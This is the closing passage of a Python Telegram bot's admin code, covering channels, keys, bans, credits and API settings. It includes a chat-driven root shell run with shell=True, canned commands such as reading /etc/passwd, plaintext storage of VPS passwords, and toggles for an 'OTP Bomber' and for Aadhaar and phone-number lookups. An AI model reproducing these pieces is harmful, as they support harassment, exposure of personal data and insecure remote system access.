        bot.reply_to(m, "📭 No channels found.", parse_mode='HTML')
        return
    
    mk = types.InlineKeyboardMarkup(row_width=2)
    
    for channel in force_channels:
        channel_username = channel['channel_username']
        channel_type = channel['channel_type']
        channel_type_emoji = "🔒" if channel_type == "private" else "📢"
        mk.add(types.InlineKeyboardButton(f"{channel_type_emoji} {channel_username}", callback_data=f"cmrem_{channel_username}"))
    
    mk.add(types.InlineKeyboardButton("❌ Cancel", callback_data="cm_cancel"))
    
    bot.reply_to(m, "🗑 <b>Select Channel to Remove:</b>", reply_markup=mk, parse_mode='HTML')

@bot.callback_query_handler(func=lambda c: c.data.startswith("cmrem_") and c.from_user.id == ADMIN_ID)
@rate_limit_and_ban_check_cb
def remove_channel_handler(c):
    uid = c.from_user.id
    channel_username = c.data.split("cmrem_")[1]
    
    # Remove channel
    global force_channels
    force_channels = [ch for ch in force_channels if ch['channel_username'] != channel_username]
    save_database(FORCE_CHANNELS_FILE, force_channels)
    
    # Remove from user tracking
    for user_id in list(user_channels.keys()):
        if channel_username in user_channels[user_id]:
            user_channels[user_id].remove(channel_username)
    
    bot.answer_callback_query(c.id, f"🗑 Channel {channel_username} removed!")
    bot.delete_message(c.message.chat.id, c.message.message_id)
    
    if uid in action_sessions:
        del action_sessions[uid]
    
    log_to_group(f"🗑 CHANNEL REMOVED\n👑 Admin: {c.from_user.first_name}\n📢 Channel: {channel_username}")

def list_all_channels(m):
    """List all channels"""
    if not force_channels:
        bot.reply_to(m, "📭 No channels configured.", parse_mode='HTML')
        return
    
    public_channels = []
    private_channels = []
    
    for channel in force_channels:
        if channel['channel_type'] == "public":
            public_channels.append((channel['channel_username'], channel['channel_link']))
        else:
            private_channels.append((channel['channel_username'], channel['channel_link']))
    
    response = "📢 <b>FORCE CHANNELS</b>\n\n"
    
    if public_channels:
        response += "<b>Public Channels:</b>\n"
        for i, (username, link) in enumerate(public_channels, 1):
            response += f"{i}. {username} - {link}\n"
        response += "\n"
    
    if private_channels:
        response += "<b>Private Channels:</b>\n"
        for i, (username, link) in enumerate(private_channels, 1):
            response += f"{i}. {username} - {link}\n"
    
    bot.reply_to(m, response, parse_mode='HTML')

def update_all_channels(m):
    """Update channel status for all users"""
    bot.reply_to(m, "🔄 <b>Updating channel status for all users...</b>", parse_mode='HTML')
    
    updated = 0
    failed = 0
    
    for user_id_str in list(users_db.keys()):
        try:
            user_id = int(user_id_str)
            if user_id == ADMIN_ID:
                continue
            
            # Check and update channel joins
            joined, _ = check_all_channels_join(user_id)
            if joined:
                # Verify referral if any
                verify_referral(user_id)
                updated += 1
        except:
            failed += 1
    
    bot.reply_to(
        m,
        f"✅ <b>Channel Update Complete!</b>\n\n"
        f"🔄 <b>Updated:</b> {updated} users\n"
        f"❌ <b>Failed:</b> {failed} users\n\n"
        f"Referral points have been awarded where applicable.",
        parse_mode='HTML'
    )

@bot.callback_query_handler(func=lambda c: c.data == "cm_cancel" and c.from_user.id == ADMIN_ID)
@rate_limit_and_ban_check_cb
def channel_cancel(c):
    uid = c.from_user.id
    if uid in action_sessions:
        del action_sessions[uid]
    bot.answer_callback_query(c.id, "❌ Cancelled")
    bot.delete_message(c.message.chat.id, c.message.message_id)

@bot.callback_query_handler(func=lambda c: c.data == "op_delete_key" and c.from_user.id == ADMIN_ID)
@rate_limit_and_ban_check_cb
def delete_key_menu(c):
    # Get unused keys
    unused_keys = {k: v for k, v in keys_db.items() if not v.get('used', False)}
    
    if not unused_keys:
        bot.answer_callback_query(c.id, "❌ No unused keys found", show_alert=True)
        return
    
    mk = types.InlineKeyboardMarkup(row_width=2)
    
    for key_code, key_data in list(unused_keys.items())[:20]:  # Show first 20 keys
        key_type = "🎫" if key_data['type'] == "PREM" else "💰"
        mk.add(types.InlineKeyboardButton(f"{key_type} {key_code}", callback_data=f"delkey_{key_code}"))
    
    mk.add(types.InlineKeyboardButton("❌ Cancel", callback_data="op_back"))
    
    bot.edit_message_text(
        "🗑 <b>SELECT KEY TO DELETE</b>\n\nSelect a key to delete:",
        c.message.chat.id,
        c.message.message_id,
        reply_markup=mk,
        parse_mode='HTML'
    )

@bot.callback_query_handler(func=lambda c: c.data.startswith("delkey_") and c.from_user.id == ADMIN_ID)
@rate_limit_and_ban_check_cb
def delete_key_handler(c):
    key_code = c.data.split("delkey_")[1]
    
    if key_code in keys_db:
        del keys_db[key_code]
        save_database(KEYS_DB_FILE, keys_db)
        
        bot.answer_callback_query(c.id, f"🗑 Key {key_code} deleted!")
        bot.delete_message(c.message.chat.id, c.message.message_id)
        
        log_to_group(f"🗑 KEY DELETED\n👑 Admin: {c.from_user.first_name}\n🔑 Key: {key_code}")
    else:
        bot.answer_callback_query(c.id, "❌ Key not found", show_alert=True)

@bot.callback_query_handler(func=lambda c: c.data == "op_update_all" and c.from_user.id == ADMIN_ID)
@rate_limit_and_ban_check_cb
def update_all(c):
    bot.answer_callback_query(c.id, "🔄 Updating all databases...")
    
    # Save all databases
    save_all_databases()
    
    # Reload global requirements
    load_global_requirements()
    
    bot.send_message(
        c.message.chat.id,
        f"✅ <b>All Systems Updated!</b>\n\n"
        f"• Databases saved\n"
        f"• Global requirements reloaded\n"
        f"• Cache cleared\n\n"
        f"📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        parse_mode='HTML'
    )
    
    log_to_group(f"🔄 ALL SYSTEMS UPDATED\n👑 Admin: {c.from_user.first_name}")

@bot.callback_query_handler(func=lambda c: c.data == "op_admin_kali" and c.from_user.id == ADMIN_ID)
@rate_limit_and_ban_check_cb
def admin_kali_callback(c):
    admin_kali_terminal(c.message)

def admin_kali_terminal(m):
    """Kali Terminal for admin (full access)"""
    uid = m.from_user.id
    
    header = (
        "═══════════════════════════════════════════════\n"
        "           👑 ADMIN KALI TERMINAL v5.0         \n"
        "═══════════════════════════════════════════════\n"
        f" 👤 Admin: {m.from_user.first_name}\n"
        f" 🆔 ID: {uid}\n"
        " ⚡ Status: FULL ROOT ACCESS\n"
        "═══════════════════════════════════════════════\n"
        " 🛠️ <b>Available Tools:</b>\n"
        " • All Linux commands\n"
        " • System administration\n"
        " • File system access\n"
        " • Process management\n"
        "═══════════════════════════════════════════════\n"
        " 💡 Type any command (full root access)\n"
        " ❌ Type /exit to close terminal\n"
        "═══════════════════════════════════════════════\n\n"
        "root@admin-terminal:~# "
    )
    
    action_sessions[uid] = {
        'type': 'admin_kali_terminal'
    }
    
    # Create terminal UI with admin buttons
    mk = types.InlineKeyboardMarkup(row_width=3)
    mk.add(
        types.InlineKeyboardButton("📁 ls -la", callback_data="admin_ls"),
        types.InlineKeyboardButton("📍 pwd", callback_data="admin_pwd"),
        types.InlineKeyboardButton("👤 whoami", callback_data="admin_whoami")
    )
    mk.add(
        types.InlineKeyboardButton("💻 system", callback_data="admin_system"),
        types.InlineKeyboardButton("🌐 network", callback_data="admin_network"),
        types.InlineKeyboardButton("⚡ processes", callback_data="admin_processes")
    )
    mk.add(
        types.InlineKeyboardButton("📊 disk", callback_data="admin_disk"),
        types.InlineKeyboardButton("👀 users", callback_data="admin_users"),
        types.InlineKeyboardButton("🔧 services", callback_data="admin_services")
    )
    mk.add(
        types.InlineKeyboardButton("🛡️ firewall", callback_data="admin_firewall"),
        types.InlineKeyboardButton("🔐 ssh", callback_data="admin_ssh"),
        types.InlineKeyboardButton("🗑️ cleanup", callback_data="admin_cleanup")
    )
    mk.add(
        types.InlineKeyboardButton("🔄 clear", callback_data="admin_clear"),
        types.InlineKeyboardButton("❌ exit", callback_data="admin_exit")
    )
    
    bot.reply_to(m, header, reply_markup=mk, parse_mode='HTML')

@bot.callback_query_handler(func=lambda c: c.data.startswith("admin_") and c.from_user.id == ADMIN_ID)
@rate_limit_and_ban_check_cb
def admin_terminal_commands(c):
    uid = c.from_user.id
    
    command_map = {
        "admin_ls": "ls -la /home/",
        "admin_pwd": "pwd",
        "admin_whoami": "whoami",
        "admin_system": "uname -a && uptime && free -h",
        "admin_network": "ifconfig || ip a",
        "admin_processes": "ps aux --sort=-%cpu | head -20",
        "admin_disk": "df -h && du -sh /home/* 2>/dev/null",
        "admin_users": "cat /etc/passwd | tail -20",
        "admin_services": "systemctl list-units --type=service --state=running | head -20",
        "admin_firewall": "iptables -L -n -v 2>/dev/null || echo 'No iptables'",
        "admin_ssh": "ss -tulpn | grep :22",
        "admin_cleanup": "echo 'Cleanup commands'",
        "admin_clear": "clear",
        "admin_exit": "/exit"
    }
    
    command = command_map.get(c.data)
    
    if command == "/exit":
        if uid in action_sessions:
            del action_sessions[uid]
        bot.answer_callback_query(c.id, "🔒 Admin terminal closed.")
        bot.delete_message(c.message.chat.id, c.message.message_id)
        return
    
    if command == "clear":
        bot.delete_message(c.message.chat.id, c.message.message_id)
        admin_kali_terminal(c.message)
        return
    
    execute_admin_command(c, command)

def execute_admin_command(c, command):
    """Execute command for admin (full access)"""
    uid = c.from_user.id
    
    bot.send_chat_action(c.message.chat.id, 'typing')
    
    try:
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=30
        )
        
        output = result.stdout + result.stderr
        
        if not output.strip():
            output = "✅ Command executed successfully (no output)"
        
        # Format output
        response = f"<code># {command}\n{'-'*50}\n{output.strip()}</code>"
        
        if len(response) > 4000:
            with open("admin_output.txt", "w") as f:
                f.write(output)
            
            with open("admin_output.txt", "rb") as f:
                bot.send_document(
                    c.message.chat.id,
                    f,
                    caption=f"📄 Admin Output for: {command}",
                    parse_mode='HTML'
                )
            
            os.remove("admin_output.txt")
        else:
            bot.send_message(c.message.chat.id, response, parse_mode='HTML')
        
        bot.answer_callback_query(c.id, "✅ Command executed")
    
    except subprocess.TimeoutExpired:
        bot.answer_callback_query(c.id, "⏰ Command timeout", show_alert=True)
    except Exception as e:
        bot.answer_callback_query(c.id, f"❌ Error: {str(e)}", show_alert=True)

@bot.callback_query_handler(func=lambda c: c.data == "op_admin_vps" and c.from_user.id == ADMIN_ID)
@rate_limit_and_ban_check_cb
def admin_vps_callback(c):
    # Add admin VPS
    action_sessions[c.from_user.id] = "admin_vps_add"
    bot.send_message(
        c.message.chat.id,
        "⚡ <b>ADMIN VPS SETUP</b>\n\n"
        "Send VPS details in format:\n"
        "<code>name host port username password</code>\n\n"
        "Example:\n"
        "<code>MyVPS 192.168.1.100 22 root password123</code>\n\n"
        "Type /cancel to cancel.",
        parse_mode='HTML'
    )

@bot.message_handler(func=lambda m: action_sessions.get(m.from_user.id) == "admin_vps_add" and m.from_user.id == ADMIN_ID)
@rate_limit_and_ban_check
def admin_vps_add(m):
    uid = m.from_user.id
    text = m.text.strip()
    
    if text == '/cancel':
        if uid in action_sessions:
            del action_sessions[uid]
        bot.reply_to(m, "❌ VPS setup cancelled.", parse_mode='HTML')
        return
    
    try:
        parts = text.split()
        if len(parts) != 5:
            raise ValueError("Need 5 parameters")
        
        name, host, port_str, username, password = parts
        
        if not port_str.isdigit():
            raise ValueError("Port must be a number")
        
        port = int(port_str)
        
        # Save to database
        vps_id = f"admin_vps_{int(time.time())}"
        vps_db[vps_id] = {
            'name': name,
            'host': host,
            'port': port,
            'username': username,
            'password': password,
            'user_id': ADMIN_ID,
            'added_date': datetime.now().strftime("%Y-%m-%d")
        }
        save_database(VPS_DB_FILE, vps_db)
        
        bot.reply_to(
            m,
            f"✅ <b>Admin VPS Added!</b>\n\n"
            f"📛 <b>Name:</b> {name}\n"
            f"📍 <b>Host:</b> {host}:{port}\n"
            f"👤 <b>Username:</b> {username}\n"
            f"📅 <b>Added:</b> {datetime.now().strftime('%Y-%m-%d')}",
            parse_mode='HTML'
        )
        
        log_to_group(f"⚡ ADMIN VPS ADDED\n👑 Admin: {m.from_user.first_name}\n📛 Name: {name}\n📍 Host: {host}:{port}")
    
    except Exception as e:
        bot.reply_to(m, f"❌ Error: {str(e)}", parse_mode='HTML')
    
    finally:
        if uid in action_sessions:
            del action_sessions[uid]

# ==========================================
# 🔧 FEATURE CONTROL SYSTEM - NEW
# ==========================================
@bot.callback_query_handler(func=lambda c: c.data == "op_feature_control" and c.from_user.id == ADMIN_ID)
@rate_limit_and_ban_check_cb
def feature_control_menu(c):
    """Feature control menu"""
    mk = types.InlineKeyboardMarkup(row_width=2)
    
    # Get current feature flags
    feature_flags = settings_db.get('feature_flags', FEATURE_FLAGS.copy())
    
    # Create buttons for each feature
    features = [
        ("c_to_binary", "🔧 C to Binary"),
        ("file_hosting", "📁 File Hosting"),
        ("number_lookup", "📞 Number Lookup"),
        ("aadhaar_lookup", "🔍 Aadhaar Info"),
        ("vehicle_lookup", "🚗 Vehicle Lookup"),
        ("sherlock_lookup", "🕵️ Sherlock Lookup"),
        ("otp_bomber", "💣 OTP Bomber"),
        ("temp_mail", "📧 Temp Mail"),
        ("install_pips", "🔧 Install Pips"),
        ("kali_terminal", "💻 Kali Terminal"),
        ("vps_manager", "☁️ VPS Manager"),
        ("instagram_dl", "📥 Instagram DL")
    ]
    
    for feature_key, display_name in features:
        status = "✅" if feature_flags.get(feature_key, True) else "❌"
        mk.add(types.InlineKeyboardButton(f"{status} {display_name}", callback_data=f"fc_toggle_{feature_key}"))
    
    mk.add(types.InlineKeyboardButton("🔄 Enable All", callback_data="fc_enable_all"))
    mk.add(types.InlineKeyboardButton("🚫 Disable All", callback_data="fc_disable_all"))
    mk.add(types.InlineKeyboardButton("🔙 Back", callback_data="op_back"))
    
    bot.edit_message_text(
        "🔧 <b>FEATURE CONTROL PANEL</b>\n\n"
        "Click on any feature to toggle it ON/OFF:\n"
        "✅ = Feature is ENABLED\n"
        "❌ = Feature is DISABLED\n\n"
        "Disabled features won't be accessible to users.",
        c.message.chat.id,
        c.message.message_id,
        reply_markup=mk,
        parse_mode='HTML'
    )

@bot.callback_query_handler(func=lambda c: c.data.startswith("fc_") and c.from_user.id == ADMIN_ID)
@rate_limit_and_ban_check_cb
def feature_control_handler(c):
    action = c.data[3:]  # Remove "fc_" prefix
    
    if action == "enable_all":
        # Enable all features
        feature_flags = settings_db.get('feature_flags', {})
        for feature in FEATURE_FLAGS:
            feature_flags[feature] = True
        settings_db['feature_flags'] = feature_flags
        save_database(SETTINGS_DB_FILE, settings_db)
        
        bot.answer_callback_query(c.id, "✅ All features enabled!")
        feature_control_menu(c)
        log_to_group(f"🔧 ALL FEATURES ENABLED\n👑 Admin: {c.from_user.first_name}")
    
    elif action == "disable_all":
        # Disable all features
        feature_flags = settings_db.get('feature_flags', {})
        for feature in FEATURE_FLAGS:
            feature_flags[feature] = False
        settings_db['feature_flags'] = feature_flags
        save_database(SETTINGS_DB_FILE, settings_db)
        
        bot.answer_callback_query(c.id, "🚫 All features disabled!")
        feature_control_menu(c)
        log_to_group(f"🔧 ALL FEATURES DISABLED\n👑 Admin: {c.from_user.first_name}")
    
    elif action.startswith("toggle_"):
        # Toggle specific feature
        feature_key = action[7:]  # Remove "toggle_" prefix
        feature_flags = settings_db.get('feature_flags', FEATURE_FLAGS.copy())
        
        # Toggle the feature
        current_state = feature_flags.get(feature_key, True)
        feature_flags[feature_key] = not current_state
        settings_db['feature_flags'] = feature_flags
        save_database(SETTINGS_DB_FILE, settings_db)
        
        new_state = "ENABLED" if feature_flags[feature_key] else "DISABLED"
        bot.answer_callback_query(c.id, f"✅ Feature {feature_key} is now {new_state}!")
        
        log_to_group(f"🔧 FEATURE TOGGLED\n👑 Admin: {c.from_user.first_name}\n🔧 Feature: {feature_key}\n📊 Status: {new_state}")
        
        # Refresh the menu
        feature_control_menu(c)

# ==========================================
# 🌐 API MANAGEMENT SYSTEM - NEW
# ==========================================
@bot.callback_query_handler(func=lambda c: c.data == "op_api_management" and c.from_user.id == ADMIN_ID)
@rate_limit_and_ban_check_cb
def api_management_menu(c):
    """API Management menu"""
    mk = types.InlineKeyboardMarkup(row_width=2)
    
    # Get current APIs
    current_apis = apis_db.copy()
    
    # Create buttons for each API
    apis_list = [
        ("NUMBER_API", "📞 Number Lookup API"),
        ("AADHAAR_API", "🔍 Aadhaar Lookup API"),
        ("VEHICLE_API", "🚗 Vehicle Lookup API"),
        ("SHERLOCK_API", "🕵️ Sherlock Lookup API")
    ]
    
    for api_key, display_name in apis_list:
        api_url = current_apis.get(api_key, "Not set")
        truncated_url = api_url[:30] + "..." if len(api_url) > 30 else api_url
        mk.add(types.InlineKeyboardButton(f"{display_name}", callback_data=f"api_edit_{api_key}"))
    
    mk.add(types.InlineKeyboardButton("📋 View All APIs", callback_data="api_view_all"))
    mk.add(types.InlineKeyboardButton("🔄 Reset to Default", callback_data="api_reset_default"))
    mk.add(types.InlineKeyboardButton("🔙 Back", callback_data="op_back"))
    
    bot.edit_message_text(
        "🌐 <b>API MANAGEMENT PANEL</b>\n\n"
        "Manage API endpoints for various services.\n\n"
        "Click on any API to update its endpoint.",
        c.message.chat.id,
        c.message.message_id,
        reply_markup=mk,
        parse_mode='HTML'
    )

@bot.callback_query_handler(func=lambda c: c.data.startswith("api_") and c.from_user.id == ADMIN_ID)
@rate_limit_and_ban_check_cb
def api_management_handler(c):
    action = c.data[4:]  # Remove "api_" prefix
    
    if action == "view_all":
        # View all APIs
        api_text = "🌐 <b>CURRENT API ENDPOINTS</b>\n\n"
        
        for api_key, api_url in apis_db.items():
            api_text += f"<b>{api_key}:</b>\n"
            api_text += f"<code>{api_url}</code>\n\n"
        
        bot.send_message(c.message.chat.id, api_text, parse_mode='HTML')
        bot.answer_callback_query(c.id)
    
    elif action == "reset_default":
        # Reset to default APIs
        apis_db.clear()
        apis_db.update(APIS.copy())
        save_database(APIS_DB_FILE, apis_db)
        
        bot.answer_callback_query(c.id, "✅ APIs reset to default!")
        api_management_menu(c)
        log_to_group(f"🌐 APIs RESET TO DEFAULT\n👑 Admin: {c.from_user.first_name}")
    
    elif action.startswith("edit_"):
        # Edit specific API
        api_key = action[5:]  # Remove "edit_" prefix
        action_sessions[c.from_user.id] = f"edit_api_{api_key}"
        
        current_url = apis_db.get(api_key, "")
        
        bot.send_message(
            c.message.chat.id,
            f"🌐 <b>Edit {api_key}</b>\n\n"
            f"Current URL: <code>{current_url}</code>\n\n"
            "Send the new API URL:\n\n"
            "Type /cancel to cancel.",
            parse_mode='HTML'
        )

@bot.message_handler(func=lambda m: action_sessions.get(m.from_user.id, "").startswith("edit_api_") and m.from_user.id == ADMIN_ID)
@rate_limit_and_ban_check
def edit_api_process(m):
    uid = m.from_user.id
    action = action_sessions[uid]
    api_key = action[9:]  # Remove "edit_api_" prefix
    new_url = m.text.strip()
    
    if new_url == '/cancel':
        if uid in action_sessions:
            del action_sessions[uid]
        bot.reply_to(m, "❌ API update cancelled.", parse_mode='HTML')
        return
    
    # Update API URL
    apis_db[api_key] = new_url
    save_database(APIS_DB_FILE, apis_db)
    
    bot.reply_to(
        m,
        f"✅ <b>API Updated Successfully!</b>\n\n"
        f"🔑 <b>API Key:</b> {api_key}\n"
        f"🌐 <b>New URL:</b> <code>{new_url}</code>\n\n"
        f"📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        parse_mode='HTML'
    )
    
    log_to_group(f"🌐 API UPDATED\n👑 Admin: {m.from_user.first_name}\n🔑 API: {api_key}\n🌐 URL: {new_url}")
    
    if uid in action_sessions:
        del action_sessions[uid]

# ==========================================
# USER MANAGEMENT
# ==========================================
@bot.callback_query_handler(func=lambda c: c.data == "op_user_mgmt" and c.from_user.id == ADMIN_ID)
@rate_limit_and_ban_check_cb
def user_management_callback(c):
    user_management_menu(c.message)

def user_management_menu(m):
    """User management menu"""
    mk = types.InlineKeyboardMarkup(row_width=2)
    mk.add(
        types.InlineKeyboardButton("🚫 Ban User", callback_data="um_ban"),
        types.InlineKeyboardButton("✅ Unban User", callback_data="um_unban")
    )
    mk.add(
        types.InlineKeyboardButton("👤 User Info", callback_data="um_info"),
        types.InlineKeyboardButton("💰 Adjust Credits", callback_data="um_credits")
    )
    mk.add(
        types.InlineKeyboardButton("👑 Add Premium", callback_data="um_premium"),
        types.InlineKeyboardButton("📊 Referral Stats", callback_data="um_refstats")
    )
    mk.add(
        types.InlineKeyboardButton("🔙 Back", callback_data="op_back")
    )
    
    bot.reply_to(m, "👤 <b>USER MANAGEMENT</b>\n\nSelect an option:", reply_markup=mk, parse_mode='HTML')

@bot.callback_query_handler(func=lambda c: c.data.startswith("um_") and c.from_user.id == ADMIN_ID)
@rate_limit_and_ban_check_cb
def user_management_actions(c):
    uid = c.from_user.id
    action = c.data[3:]
    
    if action == "ban":
        action_sessions[uid] = "ban_user"
        bot.send_message(c.message.chat.id, "🚫 Enter User ID to ban:", parse_mode='HTML')
    
    elif action == "unban":
        action_sessions[uid] = "unban_user"
        bot.send_message(c.message.chat.id, "✅ Enter User ID to unban:", parse_mode='HTML')
    
    elif action == "info":
        action_sessions[uid] = "user_info"
        bot.send_message(c.message.chat.id, "👤 Enter User ID for info:", parse_mode='HTML')
    
    elif action == "credits":
        action_sessions[uid] = "adjust_credits"
        bot.send_message(c.message.chat.id, "💰 Enter User ID and amount (format: user_id amount):", parse_mode='HTML')
    
    elif action == "premium":
        action_sessions[uid] = "add_premium"
        bot.send_message(c.message.chat.id, "👑 Enter User ID and days (format: user_id days):", parse_mode='HTML')
    
    elif action == "refstats":
        show_referral_stats(c.message)
    
    elif action == "back":
        bot.delete_message(c.message.chat.id, c.message.message_id)

@bot.message_handler(func=lambda m: action_sessions.get(m.from_user.id) in [
    "ban_user", "unban_user", "user_info", "adjust_credits", "add_premium"
] and m.from_user.id == ADMIN_ID)
@rate_limit_and_ban_check
def process_admin_actions(m):
    uid = m.from_user.id
    action = action_sessions[uid]
    text = m.text.strip()
    
    try:
        if action == "ban_user":
            # Ban user for 30 minutes
            if not text.isdigit():
                bot.reply_to(m, "❌ Invalid User ID", parse_mode='HTML')
                if uid in action_sessions:
                    del action_sessions[uid]
                return
            
            target_id = int(text)
            ban_expiry = datetime.now() + timedelta(minutes=30)
            ban_reason = "Admin ban"
            
            bans_db[str(target_id)] = {
                'expiry': ban_expiry.isoformat(),
                'reason': ban_reason
            }
            save_database(BANS_DB_FILE, bans_db)
            
            # Notify user
            try:
                bot.send_message(
                    target_id,
                    f"🚫 <b>YOU ARE BANNED</b> 🚫\n\n"
                    f"You have been banned by admin.\n"
                    f"<b>Duration:</b> 30 minutes\n"
                    f"<b>Reason:</b> {ban_reason}\n"
                    f"<b>Banned Until:</b> {ban_expiry.strftime('%Y-%m-%d %H:%M:%S')}\n\n"
                    f"To appeal, contact: {OWNER_USERNAME}",
                    parse_mode='HTML'
                )
            except:
                pass
            
            bot.reply_to(m, f"✅ User {target_id} banned for 30 minutes", parse_mode='HTML')
            log_to_group(f"🚫 ADMIN BAN\n👤 Target: {target_id}\n👑 Admin: {m.from_user.first_name}")
        
        elif action == "unban_user":
            # Unban user
            if not text.isdigit():
                bot.reply_to(m, "❌ Invalid User ID", parse_mode='HTML')
                if uid in action_sessions:
                    del action_sessions[uid]
                return
            
            target_id = int(text)
            
            if str(target_id) in bans_db:
                del bans_db[str(target_id)]
                save_database(BANS_DB_FILE, bans_db)
            
            # Notify user
            try:
                bot.send_message(target_id, "✅ Your ban has been lifted by admin.", parse_mode='HTML')
            except:
                pass
            
            bot.reply_to(m, f"✅ User {target_id} unbanned", parse_mode='HTML')
            log_to_group(f"✅ ADMIN UNBAN\n👤 Target: {target_id}\n👑 Admin: {m.from_user.first_name}")
        
        elif action == "user_info":
            # Get user info
            if not text.isdigit():
                bot.reply_to(m, "❌ Invalid User ID", parse_mode='HTML')
                if uid in action_sessions:
                    del action_sessions[uid]
                return
            
            target_id = int(text)
            user_info = users_db.get(str(target_id), {})
            premium = is_premium(target_id)
            banned = str(target_id) in bans_db
            
            # Format info
            username = user_info.get('username', 'N/A')
            first_name = user_info.get('first_name', 'N/A')
            joined_date = user_info.get('joined_date', 'N/A')
            credits = user_info.get('credits', 0)
            referrals = user_info.get('total_referrals', 0)
            points = user_info.get('referral_points', 0)
            
            premium_status = "✅ Premium" if premium else "❌ Free"
            
            ban_status = "✅ Not banned"
            if banned:
                ban_data = bans_db[str(target_id)]
                ban_expiry = datetime.fromisoformat(ban_data['expiry'])
                if ban_expiry > datetime.now():
                    ban_status = f"🚫 Banned until {ban_expiry.strftime('%Y-%m-%d %H:%M')}"
            
            info_text = (
                f"👤 <b>USER INFORMATION</b>\n"
                f"══════════════════════════════\n\n"
                f"🆔 <b>User ID:</b> {target_id}\n"
                f"👤 <b>Username:</b> @{username}\n"
                f"📛 <b>First Name:</b> {first_name}\n"
                f"📅 <b>Joined:</b> {joined_date}\n\n"
                f"📊 <b>STATUS</b>\n"
                f"{premium_status}\n"
                f"{ban_status}\n\n"
                f"💰 <b>CREDITS</b>\n"
                f"<b>Balance:</b> {credits}\n"
                f"<b>Referrals:</b> {referrals}\n"
                f"<b>Points:</b> {points}"
            )
            
            bot.reply_to(m, info_text, parse_mode='HTML')
        
        elif action == "adjust_credits":
            # Adjust user credits
            parts = text.split()
            if len(parts) != 2 or not parts[0].isdigit() or not parts[1].isdigit():
                bot.reply_to(m, "❌ Format: user_id amount", parse_mode='HTML')
                if uid in action_sessions:
                    del action_sessions[uid]
                return
            
            target_id = int(parts[0])
            amount = int(parts[1])
            
            target_str = str(target_id)
            if target_str not in users_db:
                users_db[target_str] = {
                    'user_id': target_id,
                    'credits': amount,
                    'referral_points': 0,
                    'total_referrals': 0
                }
            else:
                users_db[target_str]['credits'] = users_db[target_str].get('credits', 0) + amount
            
            save_database(USERS_DB_FILE, users_db)
            new_balance = users_db[target_str]['credits']
            
            bot.reply_to(
                m,
                f"✅ <b>Credits adjusted!</b>\n\n"
                f"👤 <b>User:</b> {target_id}\n"
                f"💰 <b>Amount:</b> {amount:+}\n"
                f"📊 <b>New Balance:</b> {new_balance}",
                parse_mode='HTML'
            )
            
            log_to_group(f"💰 CREDITS ADJUSTED\n👤 Target: {target_id}\n💰 Amount: {amount:+}\n👑 Admin: {m.from_user.first_name}")
        
        elif action == "add_premium":
            # Add premium to user
            parts = text.split()
            if len(parts) != 2 or not parts[0].isdigit() or not parts[1].isdigit():
                bot.reply_to(m, "❌ Format: user_id days", parse_mode='HTML')
                if uid in action_sessions:
                    del action_sessions[uid]
                return
            
            target_id = int(parts[0])
            days = int(parts[1])
            
            expiry = (datetime.now() + timedelta(days=days)).isoformat()
            subs_db[str(target_id)] = {'expiry': expiry}
            save_database(SUBS_DB_FILE, subs_db)
            
            bot.reply_to(
                m,
                f"✅ <b>Premium added!</b>\n\n"
                f"👤 <b>User:</b> {target_id}\n"
                f"⏰ <b>Duration:</b> {days} days\n"
                f"📅 <b>Expires:</b> {(datetime.now() + timedelta(days=days)).strftime('%Y-%m-%d')}",
                parse_mode='HTML'
            )
            
            # Notify user
            try:
                bot.send_message(
                    target_id,
                    f"🎉 <b>PREMIUM ACTIVATED!</b>\n\n"
                    f"Admin has added premium to your account.\n"
                    f"<b>Duration:</b> {days} days\n"
                    f"<b>Expires:</b> {(datetime.now() + timedelta(days=days)).strftime('%Y-%m-%d')}\n\n"
                    f"Enjoy premium features!",
                    parse_mode='HTML'
                )
            except:
                pass
            
            log_to_group(f"👑 PREMIUM ADDED\n👤 Target: {target_id}\n⏰ Duration: {days} days\n👑 Admin: {m.from_user.first_name}")
    
    except Exception as e:
        bot.reply_to(m, f"❌ Error: {str(e)}", parse_mode='HTML')
    
    finally:
        if uid in action_sessions:
            del action_sessions[uid]

def show_referral_stats(m):
    """Show referral statistics"""
    # Top referrers
    top_referrers = []
    for user_id_str, user_data in users_db.items():
        if user_data.get('referral_points', 0) > 0:
            top_referrers.append((int(user_id_str), user_data))
    
    top_referrers.sort(key=lambda x: x[1].get('referral_points', 0), reverse=True)
    top_referrers = top_referrers[:10]
    
    # Total stats
    total_users = len(users_db)
    total_points = sum(user.get('referral_points', 0) for user in users_db.values())
    total_referrals = sum(user.get('total_referrals', 0) for user in users_db.values())
    
    response = "📊 <b>REFERRAL STATISTICS</b>\n\n"
    response += f"👥 <b>Total Users:</b> {total_users}\n"
    response += f"⭐ <b>Total Points:</b> {total_points}\n"
    response += f"🤝 <b>Total Referrals:</b> {total_referrals}\n\n"
    
    if top_referrers:
        response += "<b>🏆 Top Referrers:</b>\n"
        for i, (user_id, user_data) in enumerate(top_referrers, 1):
            username = user_data.get('username', f'ID:{user_id}')
            points = user_data.get('referral_points', 0)
            referrals = user_data.get('total_referrals', 0)
            response += f"{i}. {username} - {points} pts ({referrals} refs)\n"
    
    bot.reply_to(m, response, parse_mode='HTML')

@bot.callback_query_handler(func=lambda c: c.data == "op_back" and c.from_user.id == ADMIN_ID)
@rate_limit_and_ban_check_cb
def owner_back(c):
    owner_panel(c.message)

# ==========================================
# 🚀 START BOT - WITH DEBUG INFO
# ==========================================
if __name__ == "__main__":
    print("✨ KING MASTER BOT V23 STARTED ✨")
    print(f"🤖 Bot: {BOT_USERNAME}")
    print(f"👑 Owner: {OWNER_USERNAME}")
    print(f"🔑 Admin ID: {ADMIN_ID}")
    print("═" * 50)
    
    # Webhook remove karo
    try:
        bot.remove_webhook()
        time.sleep(1)
        print("✅ Webhook removed")
    except:
        print("✅ No webhook found")
    
    # Check for required modules
    required_modules = ['paramiko', 'psutil', 'instaloader', 'aiohttp', 'colorama', 'beautifulsoup4']
    for module in required_modules:
        try:
            __import__(module)
            print(f"✅ {module} module is installed")
        except ImportError:
            print(f"⚠️ {module} module not found. Installing...")
            subprocess.run([sys.executable, '-m', 'pip', 'install', module], capture_output=True)
    
    # Load global requirements if exists
    global_req_path = os.path.join(BASE_DIR, 'global_requirements.txt')
    if os.path.exists(global_req_path):
        with open(global_req_path, 'r') as f:
            module_count = len([line for line in f if line.strip()])
        print(f"📦 Global requirements: {module_count} modules")
    else:
        print("⚠️ No global requirements.txt found")
